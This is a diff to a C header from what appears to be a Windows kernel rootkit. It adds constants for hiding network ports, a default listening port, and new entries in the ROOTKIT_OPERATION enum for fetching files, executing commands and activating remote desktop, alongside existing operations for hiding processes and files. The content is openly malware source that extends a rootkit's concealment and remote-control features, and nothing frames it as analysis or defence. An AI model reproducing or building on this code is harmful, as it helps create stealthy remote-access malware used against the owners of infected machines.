@@ -526,6 +526,7 @@ typedef struct _SHORTENEDACTEPROCESS {
 #define UNHIDE_FILEFOLDER ((NTSTATUS)0x00000121L)  // Temporary success for un-hiding file/folder
 #define HIDE_FILEFOLDER  ((NTSTATUS)0x40000028L)  // Temporary success for hiding file/folder
 #define SHOWHIDDEN_FILEFOLDER ((NTSTATUS)0x00000125L)  // Temporary success for showing list
+
 #define UNHIDE_PROCESS ((NTSTATUS)0xC00000C3L)  // Code used by client/medium for unhiding process
 #define HIDE_PROCESS ((NTSTATUS)0xC00000D6L)  // Code used by client/medium for hiding process
 #define SHOWHIDDEN_PROCESS ((NTSTATUS)0xC00000E4L)  // Code used by client/medium for listing hidden processes
@@ -534,6 +535,14 @@ typedef struct _SHORTENEDACTEPROCESS {
 #define HideProcess 0xCDCDCDCDDCDCDCDC
 #define ListHiddenProcesses 0x0D0D0D0DD0D0D0D0
 
+#define UNHIDE_PORT ((NTSTATUS)0xC00000C3L)  // Code used by client/medium for unhiding ports
+#define HIDE_PORT ((NTSTATUS)0xC00000D6L)  // Code used by client/medium for hiding ports
+#define SHOWHIDDEN_PORTS ((NTSTATUS)0xC00000E4L)  // Code used by client/medium for listing hidden ports
+#define REMOVE_BY_INDEX_PORT 47
+#define UnhidePort 0xC0C0C0C00C0C0C0C
+#define HidePort 0xCDCDCDCDDCDCDCDC
+#define ListHiddenPorts 0x0D0D0D0DD0D0D0D0
+#define DEFAULT_MEDIUM_PORT 44444
 
 #define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
 
@@ -729,9 +738,14 @@ typedef enum _ROOTKIT_OPERATION {
 	RKOP_HIDEPROC = 0xB00000CF,
 	RKOP_HIDEPORT = 0xB00000DF,
 
-	RKOP_NOOPERATION = 0xB00000EF,
-	RKOP_TERMINATE = 0xB00000FF,
+	RKOP_GETFILE = 0xB00000EF,
+	RKOP_EXECOMMAND = 0xB00000FF,
+	RKOP_ACTIVATERDP = 0xB0000100,
+
+	RKOP_NOOPERATION = 0xB0000101,
+	RKOP_TERMINATE = 0xB0000102,
 }ROOTKIT_OPERATION, * PROOTKIT_OPERATION;
+
 
 
 // Unexpected errors constants -
